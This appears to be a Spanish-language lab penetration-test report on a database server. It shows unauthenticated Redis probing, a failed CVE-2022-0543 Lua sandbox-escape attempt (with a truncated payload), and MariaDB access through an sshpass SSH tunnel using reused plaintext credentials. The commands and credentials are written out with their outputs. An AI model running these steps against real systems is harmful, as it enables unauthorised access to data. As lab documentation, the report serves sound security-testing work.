# Fase 4.1 · M2 · Base de datos y Redis

**Objetivo:** acceder a Redis y MariaDB, demostrar exposición y obtener datos.
**Ejecuta:** M6 → M2 `10.10.10.12` (Redis directo; MySQL por túnel SSH desde M1).
**Fecha UTC:** 2026-10-24.

---

## 4.1.1 Comandos demo (simples)

| # | Comando | Qué muestra |
|---|---|---|
| 1 | `redis-cli -h 10.10.10.12 PING` | Redis sin autenticación (`PONG`) |
| 2 | `redis-cli -h 10.10.10.12 INFO server \| grep redis_version` | Versión 6.2.6 |
| 3 | `redis-cli -h 10.10.10.12 CONFIG GET requirepass` | `requirepass` vacío |
| 4 | `mysql --skip-ssl -h 127.0.0.1 -P 13306 -u wp_user -p'wp_pass123' -e 'SHOW DATABASES;'` | BD `wordpress` |
| 5 | `mysql ... -u moodle_user -p'wp_pass123' -e 'SELECT COUNT(*) ...'` | 487 tablas de Moodle |

---

## 4.1.2 D1/D3 · Redis 6.2.6 sin autenticación

```bash
redis-cli -h 10.10.10.12 PING
redis-cli -h 10.10.10.12 INFO server | grep -E 'redis_version|os:|tcp_port'
redis-cli -h 10.10.10.12 CONFIG GET requirepass
```

**Salida real** (`F04-001`):

```text
== PING ==
PONG
== versión ==
redis_version:6.2.6
os:Linux 5.15.0-198-generic x86_64
tcp_port:6379
== requirepass ==
requirepass
```

**Interpretación:** Redis responde sin contraseña; `requirepass` está vacío. Cualquiera en la LAN puede leer/escribir el almacén. Esto valida **D1 (exposición)** y **D3 (puerto 6379 abierto)**.

Lectura adicional (`F04-001b`):

```text
DBSIZE → 0
KEYS * → (vacío)
CONFIG GET dir → /var/lib/redis
```

---

## 4.1.3 D1 · Intento de CVE-2022-0543 (Lua sandbox escape)

```bash
redis-cli -h 10.10.10.12 EVAL 'local l=package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_os"); ...' 0
```

**Salida real** (`F04-001b`):

```text
ERR Error running script ...: @enable_strict_lua:15: user_script:1:
Script attempted to access nonexistent global variable 'package'
```

**Interpretación:** el Redis del laboratorio está compilado de fuente y aplica `enable_strict_lua`; el objeto `package` no está disponible. **CVE-2022-0543 no es explotable en este build**. Se documenta la limitación y se sostiene el impacto con D2/D3 (acceso sin auth + volcado de BD). No se afirma RCE.

---

## 4.1.4 D2 · MariaDB con credenciales de `wp-config.php`

```bash
# Túnel desde M1
sshpass -p 'Admin13.-' ssh -N -L 13306:10.10.10.12:3306 ubuntu@10.10.10.11 &
mysql --skip-ssl -h 127.0.0.1 -P 13306 -u wp_user -p'wp_pass123' -e 'SHOW DATABASES;'
mysql --skip-ssl -h 127.0.0.1 -P 13306 -u wp_user -p'wp_pass123' \
  -e 'SELECT COUNT(*) AS tablas FROM information_schema.tables WHERE table_schema="wordpress";'
```

**Salida real** (`F04-003`):

```text
== bases de datos ==
Database
information_schema
wordpress
== tablas wordpress ==
tablas
12
```

**Interpretación:** las credenciales reales son **`wp_user` / `wp_pass123`** (la guía interna decía `ClaveDebil123`; se corrige). El usuario puede leer `wordpress` (12 tablas). Es el salto M1 → M2.

Moodle (`F04-004b`):

```text
$CFG->dbuser = 'moodle_user';
$CFG->dbpass = 'wp_pass123';
tablas moodle_db = 487
```

**Impacto:** con `wp_pass123` se accede a las 12 tablas de WordPress y a las 487 de Moodle; los datos son ficticios, pero el acceso es real.

---

## 4.1.5 D4 · SNMP (pendiente)

`nmap` desde M6 muestra **161/tcp filtered**. SNMP quedó restringido a M1 o al host local. No se validó `snmpwalk`/`snmpset` desde M6. Se intentará desde M1 (cliente SNMP) o se documentará como **no accesible desde el atacante**; en cualquier caso, la configuración `public/private` sigue siendo una debilidad si se alcanza la red interna.

---

## 4.1.6 Resultado

| ID | Estado | Evidencia |
|---|---|---|
| D1 (Redis sin auth) | ✅ Validado (exposición); RCE ❌ no explotable | `F04-001`, `F04-001b` |
| D2 (credenciales DB) | ✅ Validado (`wp_user`/`wp_pass123`, 12 + 487 tablas) | `F04-003`, `F04-004b` |
| D3 (6379 expuesto) | ✅ Validado | `F02-001`, `F04-001` |
| D4 (SNMP) | ⬜ Pendiente / filtrado | `F02-001` |

**Cierre:** M2 comprometido a nivel de datos. La RCE de Redis no se pudo demostrar por el build; se declara con honestidad.
